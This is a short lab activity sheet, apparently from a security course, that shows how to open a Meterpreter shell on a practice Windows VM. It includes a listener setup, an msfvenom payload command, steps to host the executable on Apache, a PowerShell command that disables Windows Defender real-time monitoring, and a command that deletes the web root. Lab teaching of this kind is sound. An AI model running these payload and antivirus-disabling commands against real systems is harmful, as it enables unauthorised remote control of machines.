## Activity File: Metasploit
In this activity, you will use Metasploit and MSFvenom to open a shell on your Windows VM.

### Instructions 

1. Login to the Kali machine with credentials `root/toor`

2. Click on the Metasploit icon on the taskbar

3. Once metasploit is started, use the `exploit/multi/handler` module.

4. Gather your IP address for your Kali host and set your LHOST and LPORT settings.

5. Once LPORT and LHOST is set, start the listener by typing `run -j`.

7. Generate the agent/payload by typing `msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe` 

8. Clear out the /var/www/html/ folder: `rm /var/www/html/*`

9. Move the payload to /var/www/html and start the apache web service

10. Now move from your Kali VM to your Windows VM. Open an web browser and browse to your Kali's IP address. Download the `shell.exe` payload and execute it.

- Note: Windows Defender should be turned off. If not turned off, open PowerShell as administrator and run `Set-MPPreference -DisableRealTimeMonitoring $true` 

11. Back in Kali, you should see a message "Meterpreter Session 1 opened". To interact with this session, type `sessions -i 1`

12. You now have a shell into the Windows machine, with Metasploit operating as the C2 server. Gather the IP address of the Windows host. 